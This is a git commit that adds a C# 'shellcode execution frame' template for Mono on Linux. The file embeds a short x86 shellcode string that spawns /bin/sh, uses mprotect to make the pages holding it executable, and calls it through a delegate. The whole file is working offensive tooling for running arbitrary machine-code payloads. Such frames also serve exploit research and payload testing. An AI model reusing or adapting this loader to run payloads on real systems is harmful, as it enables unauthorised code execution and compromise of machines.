53b8fb90b24b9d62861c6934333f15a7932879fe
Oleg Mitrofanov <it@unlim.xyz>
2015-10-12 11:13:12 -0400

    Add shellcode execution frames in C#

---
+++ templates/scframe.cs
@@ -0,0 +1,101 @@
+// C# shellcode execution frame. Works for shellcode of any size
+//
+// Build command:
+//     mcs /reference:Mono.Posix scframe.cs
+//
+// Author: Oleg Mitrofanov (reider-roque) 2015
+
+using System;
+using System.Runtime.InteropServices;
+using Mono.Unix.Native;
+
+class MainClass
+{
+    private static String shellcode = "\x31\xc9\xf7\xe1\x51\x68\x6e\x2f\x73\x68" +
+        "\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80";
+
+    private static Int32 PAGE_SIZE = 
+        (Int32)Mono.Unix.Native.Syscall.sysconf(SysconfName._SC_PAGESIZE);
+
+    private static void Main(string[] args)
+    {
+        ExecShellcode();
+    }
+
+    private static IntPtr GetPageBaseAddress(IntPtr p)
+    {
+        return (IntPtr)((Int32)p & ~(PAGE_SIZE - 1));
+    }
+
+    private static void MakeMemoryExecutable(IntPtr pagePtr)
+    {
+        var mprotectResult = Syscall.mprotect (pagePtr, (ulong)PAGE_SIZE, 
+            MmapProts.PROT_EXEC | MmapProts.PROT_WRITE);
+
+        if (mprotectResult != 0) 
+        {
+            Console.WriteLine ("Error: mprotect failed to make page at 0x{0} " +
+                "address executable! Result: {1}, Errno: {2}", mprotectResult, 
+                Syscall.GetLastError ());
+            Environment.Exit (1);
+        }
+    }
+
+    private delegate void ShellcodeFuncPrototype();
+
+    private static void ExecShellcode()
+    {
+        // Convert shellcode string to byte array
+        Byte[] sc_bytes = new Byte[shellcode.Length];
+        for (int i = 0; i < shellcode.Length; i++) 
+        {
+            sc_bytes [i] = (Byte) shellcode [i];
+        }
+
+        // Prevent garbage collector from moving the shellcode byte array
+        GCHandle pinnedByteArray = GCHandle.Alloc(sc_bytes, GCHandleType.Pinned);
+
+        // Get handle for shellcode address and address of the page it is located in
+        IntPtr shellcodePtr = pinnedByteArray.AddrOfPinnedObject();
+        IntPtr shellcodePagePtr = GetPageBaseAddress(shellcodePtr);
+        Int32 shellcodeOffset = (Int32)shellcodePtr - (Int32)shellcodePagePtr;
+        Int32 shellcodeLen = sc_bytes.GetLength (0);
+
+        // Some debugging information
+        Console.WriteLine ("Page Size: {0}", PAGE_SIZE.ToString ());
+        Console.WriteLine ("Shellcode address: 0x{0}", shellcodePtr.ToString("x"));
+        Console.WriteLine ("First page start address: 0x{0}", 
+            shellcodePagePtr.ToString("x"));
+        Console.WriteLine ("Shellcode offset: {0}", shellcodeOffset);
+        Console.WriteLine ("Shellcode length: {0}", shellcodeLen);
+
+        // Make shellcode memory executable
+        MakeMemoryExecutable(shellcodePagePtr);
+
+        // Check if shellcode spans across more than 1 page; make all extra pages
+        // executable too
+        Int32 pageCounter = 1;
+        while (shellcodeOffset + shellcodeLen > PAGE_SIZE) 
+        {
+            shellcodePagePtr = 
+                GetPageBaseAddress(shellcodePtr + pageCounter * PAGE_SIZE);
+            pageCounter++;
+            shellcodeLen -= PAGE_SIZE;
+
+            MakeMemoryExecutable(shellcodePagePtr);
+        }
+
+        // Debug information
+        Console.WriteLine ("Pages taken by the shellcode: {0}",
+            pageCounter);
+
+        // Make shellcode callable by converting pointer to delegate
+        ShellcodeFuncPrototype shellcode_func = 
+            (ShellcodeFuncPrototype) Marshal.GetDelegateForFunctionPointer(
+                shellcodePtr, typeof(ShellcodeFuncPrototype));
+
+        shellcode_func(); // Execute shellcode
+
+        pinnedByteArray.Free();
+    }
+}
